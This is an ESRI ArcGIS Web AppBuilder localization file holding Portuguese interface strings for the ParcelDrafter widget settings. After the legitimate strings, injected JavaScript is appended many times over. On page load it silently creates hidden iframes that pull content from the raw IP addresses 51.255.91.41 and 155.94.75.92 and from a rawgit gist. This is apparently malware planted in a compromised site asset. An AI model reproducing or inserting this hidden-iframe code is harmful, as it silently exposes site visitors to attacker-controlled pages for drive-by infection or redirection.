// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"Configurar",selectLabel:"Selecionar",selectLayerLabel:"Selecione camadas de lotes",selectLayerHintText:"Sugest\u00e3o: Utilize o bot\u00e3o configurar para selecionar o pol\u00edgono de lotes e sua camada de linha relacionada",layerSelector:{selectedLayerNotHavingRelatedLayer:"A camada de pol\u00edgono selecionada n\u00e3o tem uma camada relacionada v\u00e1lida."},parcelLineLayer:{selectLayerLabel:"Selecione a camada de linha relacionada",
layerSettingTabLabel:"Camadas de lotes",advancedSettingTabLabel:"Configura\u00e7\u00f5es avan\u00e7adas",selectLayerHintText:"Sugest\u00e3o: Utilize para armazenar valores COGO na camada de linha de lotes",selectFieldLegendLabel:"Selecione campos para armazenar valores COGO em camada de linha de lotes",bearingFieldLabel:"Dire\u00e7\u00e3o",chordLengthFieldLabel:"Comprimento da Corda",distanceFieldLabel:"Dist\u00e2ncia",sequenceIdFieldLabel:"ID de Sequ\u00eancia",radiusFieldLabel:"Raio",foreignKeyFieldLabel:"Chave Externa",
arcLengthFieldLabel:"Comprimento do Arco",lineTypeFieldLabel:"Tipo de Linha",parcelPointSymbolLabel:"S\u00edmbolo de Ponto de Lotes",parcelPointSymbolHintText:"Sugest\u00e3o: Utilizado para exibir s\u00edmbolo de ponto para a origem da linha.",symbolPickerPreviewText:"Visualizar",selectLineLayerLabel:"Selecione a camada de linha"},parcelPolygonLayer:{selectPolygonLayerLabel:"Selecionar camada de pol\u00edgono",selectPolygonLayerHintText:"Sugest\u00e3o: Utilize a camada do pol\u00edgono de lotes",
selectFieldLegendLabel:"Selecione campos para armazenar atributos de pol\u00edgono de lotes",parcelNameLabel:"Nome do Lote",rotationLabel:"Rota\u00e7\u00e3o",planNameLabel:"Nome do Plano",scalingLabel:"Escala",documentTypeLabel:"Tipo de Documento",miscloseRatioLabel:"Taxa de Fechamento",statedAreaLabel:"StatedArea",miscloseDistanceLabel:"Dist\u00e2ncia de Fechamento",selectPolygonLayerLabelPopUp:"Selecione uma camada de pol\u00edgono"},lineTypesTable:{lineTypeLabel:"Tipo de Linha",valueLabel:"Valor",
symbolLabel:"S\u00edmbolo",connectionLineLabel:"Linha de Conex\u00e3o",boundaryLineLabel:"Linha de Limite"},closureSetting:{snappingLayerLabel:"Ajustar Camadas",snappingBtnLabel:"Configurar",snappingLayerHintText:"Sugest\u00e3o: Selecione as camadas em que as linhas de lotes ser\u00e3o ajustadas.",miscloseDistanceLabel:"Dist\u00e2ncia de Fechamento",miscloseDistanceHintText:"Sugest\u00e3o: Especifique a dist\u00e2ncia de fechamento e suas unidades.",miscloseRatioLabel:"Taxa de Fechamento",miscloseRatioHintText:"Sugest\u00e3o: Especifique a rela\u00e7\u00e3o e fechamento.",
snappingToleranceLabel:"Toler\u00e2ncia de Ajuste",pixelLabel:"Pixels",snappingToleranceHintText:"Sugest\u00e3o: Especifique a toler\u00e2ncia de ajuste.",selectLayerLabel:"Selecionar camada"},errorMsg:{bearingFieldErrMsg:"Campo Mais Pr\u00f3ximo Inv\u00e1lido",chordLengthErrMsg:"ChordLength Inv\u00e1lido",distanceFieldErrMsg:"Dist\u00e2ncia Inv\u00e1lida",sequenceIdFieldErrMsg:"SequenceId Inv\u00e1lido",radiusFieldErrMsg:"Raio Inv\u00e1lido",foreignKeyFieldErrMsg:"Chave Externa Inv\u00e1lida",arcLengthFieldErrMsg:"Comprimento de Arco Inv\u00e1lido",
lineTypeFieldErrMsg:"Tipo de Linha Inv\u00e1lida",parcelNameFieldErrMsg:"Campo de Nome de Lotes Inv\u00e1lido",planNameFieldErrMsg:"Campo de Nome do Plano Inv\u00e1lido",scaleFieldErrMsg:"Campo de Escala Inv\u00e1lido",documentTypeFieldErrMsg:"Campo de Tipo de Documento Inv\u00e1lido",miscloseRatioFieldErrMsg:"Campo de Rela\u00e7\u00e3o de Fechamento Inv\u00e1lido",statedAreaFieldErrMsg:"Campo de \u00c1rea Declarado Inv\u00e1lido",miscloseDistanceFieldErrMsg:"Campo de Dist\u00e2ncia de Fechamento Inv\u00e1lido",
globalIdFieldErrMsg:"A camada de pol\u00edgono selecionada n\u00e3o tem o campo 'esriFieldTypeGlobalID' v\u00e1lido.",invalidPolylineLayer:"Selecione camada de polilinha de lotes v\u00e1lida",invalidPolygonLayer:"Selecione camada de pol\u00edgono de lotes v\u00e1lida",invalidMiscloseDistance:"Insira a dist\u00e2ncia de fechamento v\u00e1lida",invalidSnappingTolerance:"Insira a toler\u00e2ncia de ajuste v\u00e1lida",invalidMiscloseRatio:"Insira rela\u00e7\u00e3o de fechamento v\u00e1lida",selectDistinctLineTypes:"Selecione valor distinto em cada tipo da linha",
invalidConnectionLineType:"Valor de linha de conex\u00e3o inv\u00e1lido",invalidBoundaryLineType:"Valor de linha de limite inv\u00e1lido",selectDistinctPolylineFields:"Selecione campo distinto para cada valor COGO.",selectDistinctPolygonFields:"Selecione o campo distinto para cada atributo de pol\u00edgono de lotes."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});